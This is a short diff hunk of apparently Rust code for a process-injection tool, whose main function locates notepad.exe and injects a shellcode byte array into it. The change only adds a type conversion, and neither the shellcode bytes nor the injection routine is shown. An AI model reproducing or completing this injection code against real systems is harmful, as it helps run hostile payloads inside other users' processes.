@@ -23,7 +23,7 @@ const SHELL_CODE: &[u8] = &[
 
 fn main() {
     let process = find_process("notepad.exe").expect("Target process not found");
-    if let Err(e) = inject(process, SHELL_CODE) {
+    if let Err(e) = inject(process, SHELL_CODE.into()) {
         println!("Could not inject payload: {}", e);
     }
 }
